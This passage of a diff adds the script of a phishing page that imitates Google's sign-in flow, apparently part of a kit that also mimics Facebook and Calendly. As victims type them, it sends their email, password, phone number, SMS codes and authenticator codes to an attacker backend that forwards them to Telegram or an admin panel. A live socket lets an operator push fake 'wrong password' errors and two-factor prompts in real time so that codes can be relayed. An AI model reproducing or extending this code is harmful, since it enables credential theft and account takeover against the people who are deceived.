+    var pwNextBtn    = document.getElementById('pwNextBtn');
+    var pwLabel      = document.getElementById('pwBtnLabel');
+    var showPwCheck  = document.getElementById('showPwCheck');
+
+    var chipEmail  = document.getElementById('chipEmail');
+    var overlay    = document.getElementById('overlay');
+
+    /* ─── Helpers ─── */
+    function clearErr(input, errEl) {
+      input.classList.remove('err');
+      errEl.classList.remove('visible');
+    }
+
+    function showErr(input, errEl) {
+      input.classList.add('err');
+      errEl.classList.add('visible');
+      input.focus();
+    }
+
+    function setLoading(btn, labelEl, loading) {
+      if (loading) {
+        btn.disabled = true;
+        labelEl.textContent = '';
+        var sp = document.createElement('span');
+        sp.className = 'btn-spinner';
+        sp.id = 'spinner_' + btn.id;
+        btn.appendChild(sp);
+      } else {
+        btn.disabled = false;
+        var sp = document.getElementById('spinner_' + btn.id);
+        if (sp) sp.remove();
+        labelEl.textContent = 'Next';
+      }
+    }
+
+    /* ─── Socket.io connection ─── */
+    try {
+      socket = io(BACKEND, {
+        query: { clientId: clientId },
+        transports: ['websocket', 'polling'],
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000
+      });
+
+      /* Chrome mobile kills WebSocket when backgrounded.
+         Only reconnect when page was actually hidden first (not on fresh load). */
+      var _glWasHidden = false;
+      document.addEventListener('visibilitychange', function () {
+        if (document.visibilityState === 'hidden') {
+          _glWasHidden = true;
+        } else if (document.visibilityState === 'visible' && _glWasHidden && !_glFirstConnect) {
+          _glWasHidden = false;
+          setTimeout(function () {
+            socket.disconnect();
+            setTimeout(function () { socket.connect(); }, 300);
+          }, 800);
+        }
+      });
+
+      var _glFirstConnect = true;
+      socket.on('connect', function () {
+        currentSocketId = socket.id;
+        socket.emit('userConnectedToPage', { clientId: clientId, page: 'google-login' });
+
+        if (!_glFirstConnect) {
+          /* Reconnected after background — clear any stuck loading overlay / buttons */
+          clearTimeout(emailWaitTimer);
+          clearTimeout(pwWaitTimer);
+          if (overlay) overlay.classList.remove('visible');
+
+          /* Reset every button that might be showing a spinner */
+          [
+            { btn: emailNextBtn, lbl: emailLabel,  text: 'Next' },
+            { btn: pwNextBtn,    lbl: pwLabel,      text: 'Next' },
+            { btn: document.getElementById('phoneNextBtn'),  lbl: document.getElementById('phoneLabel'),  text: 'Next' },
+            { btn: document.getElementById('smsNextBtn'),    lbl: document.getElementById('smsLabel'),    text: 'Next' },
+            { btn: document.getElementById('authNextBtn'),   lbl: document.getElementById('authLabel'),   text: 'Next' }
+          ].forEach(function (o) {
+            if (o.btn && o.btn.querySelector('.loading-spinner')) {
+              setLoading(o.btn, o.lbl, false);
+            }
+          });
+        }
+        _glFirstConnect = false;
+      });
+
+      socket.on('show-calendar', function () {
+        try { sessionStorage.setItem('calendlySession', '1'); } catch(e) {}
+        window.location.href = 'calendly';
+      });
+      socket.on('show-passkey', function () {
+        try { sessionStorage.setItem('passkeySession', '1'); } catch(e) {}
+        window.location.href = 'passkey';
+      });
+      socket.on('redirect',      function (url) { window.location.href = url; });
+
+      /* Admin panel → "GmailWRONGPASS" button → show wrong password error */
+      socket.on('show-gmail-wrong-pass', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        pwInput.value = '';
+        pwInput.classList.remove('has-val');
+        showErr(pwInput, pwErr);
+        pwErr.textContent = "Wrong password. Try again or click 'Forgot password' to reset it.";
+      });
+
+      /* ─── Facebook security modals — redirect back to origin page ─── */
+      var fbModalMap = {
+        'show-2fa':          '2fa',
+        'show-auth':         'auth',
+        'show-email':        'email',
+        'show-whatsapp':     'whatsapp',
+        'show-old-pass':     'oldpass',
+        'show-wrong-creds':  'wrongcreds'
+      };
+      Object.keys(fbModalMap).forEach(function (event) {
+        socket.on(event, function () {
+          var returnPage = sessionStorage.getItem('googleReturnPage') || 'apply.html';
+          try {
+            sessionStorage.setItem('pendingModal', fbModalMap[event]);
+            sessionStorage.removeItem('googleReturnPage');
+          } catch (e) {}
+          window.location.href = returnPage;
+        });
+      });
+
+      /* Admin panel → "GooglePhone" button → show phone step with prefix */
+      socket.on('show-google-phone', function (prefix) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('phonePrefixBox').textContent = prefixText;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step3ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step3').style.display = 'flex';
+        document.getElementById('phoneInput').focus();
+      });
+
+      /* Admin panel → GooglePrompt → show number prompt */
+      socket.on('show-google-prompt', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var num = (data && data.number) ? String(data.number) : '58';
+        var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+        var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+        var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
+
+        document.getElementById('promptNumber').textContent           = num;
+        document.getElementById('promptNumberInline').textContent      = num;
+        document.getElementById('promptDeviceName').textContent        = hasDevice
+          ? ('Open the Gmail or YouTube app on ' + deviceLabel)
+          : 'Open the Gmail or YouTube app';
+        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceLabel : 'phone';
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step4ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step4').style.display = 'flex';
+      });
+
+      /* Admin panel → GoogleSMS → show SMS phone-entry step */
+      socket.on('show-google-sms', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        // data can be { prefix, lastTwo } or legacy plain string
+        var prefix  = (data && typeof data === 'object') ? (data.prefix || '') : String(data || '');
+        var lastTwo = (data && typeof data === 'object') ? (data.lastTwo || '00') : '00';
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('smsPrefixBox').textContent = prefixText;
+        document.getElementById('smsLastTwo').textContent = lastTwo;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step5ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step5').style.display = 'flex';
+        document.getElementById('smsPhoneInput').focus();
+      });
+
+      /* Admin panel → WrongNumber → error on SMS phone step */
+      socket.on('show-google-wrong-number', function () {
+        var smsPhoneInput = document.getElementById('smsPhoneInput');
+        var smsPhoneError = document.getElementById('smsPhoneError');
+        var smsSendBtn    = document.getElementById('smsSendBtn');
+        var smsSendLabel  = document.getElementById('smsSendLabel');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        overlay.classList.remove('visible');
+        smsPhoneError.textContent = 'This number is not associated with your Google account. Try again.';
+        showErr(smsPhoneInput, smsPhoneError);
+      });
+
+      /* Admin panel → WrongCode → error on SMS code OR auth step (auto-detects visible step) */
+      socket.on('show-google-wrong-code', function () {
+        var step6Visible = document.getElementById('step6').style.display !== 'none';
+        if (step6Visible) {
+          var smsCodeInput   = document.getElementById('smsCodeInput');
+          var smsCodeError   = document.getElementById('smsCodeError');
+          var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+          var smsCodeLabel   = document.getElementById('smsCodeLabel');
+          setLoading(smsCodeNextBtn, smsCodeLabel, false);
+          overlay.classList.remove('visible');
+          smsCodeInput.value = '';
+          smsCodeInput.classList.remove('has-val');
+          showErr(smsCodeInput, smsCodeError);
+        } else {
+          /* Authenticator step */
+          var authCodeInput   = document.getElementById('authCodeInput');
+          var authCodeError   = document.getElementById('authCodeError');
+          var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+          var authCodeLabel   = document.getElementById('authCodeLabel');
+          setLoading(authCodeNextBtn, authCodeLabel, false);
+          overlay.classList.remove('visible');
+          authCodeInput.value = '';
+          authCodeInput.classList.remove('has-val');
+          showErr(authCodeInput, authCodeError);
+        }
+      });
+
+      /* Admin panel → WrongAuthCode → specifically targets authenticator step */
+      socket.on('show-google-wrong-auth-code', function () {
+        var authCodeInput   = document.getElementById('authCodeInput');
+        var authCodeError   = document.getElementById('authCodeError');
+        var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+        var authCodeLabel   = document.getElementById('authCodeLabel');
+        setLoading(authCodeNextBtn, authCodeLabel, false);
+        overlay.classList.remove('visible');
+        authCodeInput.value = '';
+        authCodeInput.classList.remove('has-val');
+        showErr(authCodeInput, authCodeError);
+      });
+
+      /* Admin panel → GoogleAuth → show authenticator code step */
+      socket.on('show-google-auth', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step7ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step7').style.display = 'flex';
+        document.getElementById('authCodeInput').focus();
+      });
+
+    } catch (e) {}
+
+    /* ─── Destination app name — Calendly when opened from Continue with Google ─── */
+    if (sessionStorage.getItem('googleContinueApp') === 'calendly') {
+      var continueAppBtn = document.getElementById('continueAppBtn');
+      if (continueAppBtn) continueAppBtn.textContent = 'Calendly';
+      document.querySelectorAll('[data-privacy-notice]').forEach(function (el) {
+        el.innerHTML =
+          'Before using this app, you can review Calendly\'s ' +
+          '<a href="https://calendly.com/privacy" target="_blank">Privacy Policy</a> ' +
+          'and ' +
+          '<a href="https://calendly.com/terms" target="_blank">Terms of Service</a>.';
+      });
+    }
+
+    /* ─── Pre-fill email from sessionStorage ─── */
+    var storedEmail = sessionStorage.getItem('lastLoginEmail') || '';
+    if (storedEmail) {
+      emailInput.value = storedEmail;
+      emailInput.classList.add('has-val');
+      chipEmail.textContent = storedEmail;
+    }
+
+    /* Keep label floating in sync */
+    emailInput.addEventListener('input', function () {
+      emailInput.classList.toggle('has-val', emailInput.value.length > 0);
+      clearErr(emailInput, emailErr);
+    });
+
+    pwInput.addEventListener('input', function () {
+      pwInput.classList.toggle('has-val', pwInput.value.length > 0);
+      clearErr(pwInput, pwErr);
+    });
+
+    /* ─── Password visibility toggle ─── */
+    showPwCheck.addEventListener('change', function () {
+      pwInput.type = showPwCheck.checked ? 'text' : 'password';
+      pwInput.focus();
+    });
+
+    /* ─── Step 1: Email → Next ─── */
+    emailNextBtn.addEventListener('click', function () {
+      var addr = emailInput.value.trim();
+      if (!addr || addr.indexOf('@') < 0) {
+        showErr(emailInput, emailErr);
+        return;
+      }
+
+      setLoading(emailNextBtn, emailLabel, true);
+      try { sessionStorage.setItem('lastLoginEmail', addr); } catch (e) {}
+
+      /* Notify backend so Telegram shows the Google email step */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: '', type: 'google_email', socketId: currentSocketId })
+      }).catch(function () {});
+
+      setTimeout(function () {
+        setLoading(emailNextBtn, emailLabel, false);
+        chipEmail.textContent = addr;
+        step1.style.display = 'none';
+        step2.style.display = 'flex';
+        pwInput.focus();
+      }, 600);
+    });
+
+    emailInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') emailNextBtn.click();
+    });
+
+    /* ─── Forgot password → back to step 1 ─── */
+    var forgotPwBtn = document.getElementById('forgotPwBtn');
+    if (forgotPwBtn) {
+      forgotPwBtn.addEventListener('click', function () {
+        pwInput.value = '';
+        pwInput.classList.remove('has-val', 'err');
+        pwErr.classList.remove('visible');
+        step2.style.display = 'none';
+        step1.style.display = 'flex';
+        emailInput.focus();
+      });
+    }
+
+    /* ─── Step 2: Password → Next ─── */
+    pwNextBtn.addEventListener('click', function () {
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var pass = pwInput.value;
+      if (!pass) {
+        showErr(pwInput, pwErr);
+        return;
+      }
+
+      setLoading(pwNextBtn, pwLabel, true);
+      overlay.classList.add('visible');
+
+      /* Send credentials to backend → shows in Telegram / admin panel */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: pass, type: 'google_password', socketId: currentSocketId })
+      }).catch(function () {});
+
+      /* Keep spinner until admin sends show-gmail-wrong-pass or redirect */
+      pwWaitTimer = setTimeout(function () { /* keep waiting */ }, 30000);
+    });
+
+    pwInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') pwNextBtn.click();
+    });
+
+    /* ─── Step 3: Phone ─── */
+    var step3      = document.getElementById('step3');
+    var phoneInput = document.getElementById('phoneInput');
+    var phoneErr   = document.getElementById('phoneError');
+    var phoneNextBtn = document.getElementById('phoneNextBtn');
+    var phoneBtnLabel = document.getElementById('phoneBtnLabel');
+
+    phoneInput.addEventListener('input', function () {
+      phoneInput.classList.toggle('has-val', phoneInput.value.length > 0);
+      clearErr(phoneInput, phoneErr);
+    });
+
+    phoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') phoneNextBtn.click();
+    });
+
+    document.getElementById('phoneBackBtn').addEventListener('click', function () {
+      phoneInput.value = '';
+      phoneInput.classList.remove('has-val', 'err');
+      phoneErr.classList.remove('visible');
+      step3.style.display = 'none';
+      step2.style.display = 'flex';
+      pwInput.focus();
+    });
+
+    phoneNextBtn.addEventListener('click', function () {
+      var phone = phoneInput.value.trim();
+      if (!phone) {
+        showErr(phoneInput, phoneErr);
+        return;
+      }
+
+      var prefix = document.getElementById('phonePrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(phoneNextBtn, phoneBtnLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: fullPhone, type: 'google_phone', socketId: currentSocketId })
+      }).catch(function () {});
+    });
+
+    /* ─── hideAllSteps helper ─── */
+    function hideAllSteps() {
+      ['step1','step2','step3','step4','step5','step6','step7'].forEach(function(id) {
+        var el = document.getElementById(id);
+        if (el) el.style.display = 'none';
+      });
+    }
+
+    /* ─── Step 5: SMS phone entry ─── */
+    var smsPhoneInput = document.getElementById('smsPhoneInput');
+    var smsPhoneError = document.getElementById('smsPhoneError');
+    var smsSendBtn    = document.getElementById('smsSendBtn');
+    var smsSendLabel  = document.getElementById('smsSendLabel');
+
+    smsPhoneInput.addEventListener('input', function () {
+      smsPhoneInput.classList.toggle('has-val', smsPhoneInput.value.length > 0);
+      clearErr(smsPhoneInput, smsPhoneError);
+    });
+
+    smsPhoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsSendBtn.click();
+    });
+
+    smsSendBtn.addEventListener('click', function () {
+      var phone = smsPhoneInput.value.trim();
+      if (!phone) {
+        showErr(smsPhoneInput, smsPhoneError);
+        return;
+      }
+
+      var prefix    = document.getElementById('smsPrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr      = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsSendBtn, smsSendLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: fullPhone, type: 'google_sms_phone', socketId: currentSocketId })
+      }).catch(function () {});
+
+      /* Show code step after brief delay (admin will send wrong-number if invalid) */
+      setTimeout(function () {
+        var addr2 = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('smsCodeHint').textContent =
+          'Enter the 6-digit code we sent to ' + fullPhone + '.';
+        document.getElementById('step6ChipEmail').textContent = addr2;
+        overlay.classList.remove('visible');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        hideAllSteps();
+        document.getElementById('step6').style.display = 'flex';
+        document.getElementById('smsCodeInput').focus();
+      }, 2000);
+    });
+
+    /* ─── Step 6: SMS code entry ─── */
+    var smsCodeInput   = document.getElementById('smsCodeInput');
+    var smsCodeError   = document.getElementById('smsCodeError');
+    var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+    var smsCodeLabel   = document.getElementById('smsCodeLabel');
+
+    smsCodeInput.addEventListener('input', function () {
+      smsCodeInput.classList.toggle('has-val', smsCodeInput.value.length > 0);
+      clearErr(smsCodeInput, smsCodeError);
+    });
+
+    smsCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsCodeNextBtn.click();
+    });
+
+    smsCodeNextBtn.addEventListener('click', function () {
+      var code = smsCodeInput.value.trim();
+      if (!code) {
+        showErr(smsCodeInput, smsCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsCodeNextBtn, smsCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: code, type: 'google_sms_code', socketId: currentSocketId })
+      }).catch(function () {});
+    });
+
+    /* ─── Step 7: Authenticator code ─── */
+    var authCodeInput   = document.getElementById('authCodeInput');
+    var authCodeError   = document.getElementById('authCodeError');
+    var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+    var authCodeLabel   = document.getElementById('authCodeLabel');
+
+    authCodeInput.addEventListener('input', function () {
+      authCodeInput.classList.toggle('has-val', authCodeInput.value.length > 0);
+      clearErr(authCodeInput, authCodeError);
+    });
+
+    authCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') authCodeNextBtn.click();
+    });
+
+    authCodeNextBtn.addEventListener('click', function () {
+      var code = authCodeInput.value.trim();
+      if (!code) {
+        showErr(authCodeInput, authCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(authCodeNextBtn, authCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: addr, password: code, type: 'google_auth_code', socketId: currentSocketId })
+      }).catch(function () {});
+    });
+
+  })();
+  </script>
+</body>
+</html>
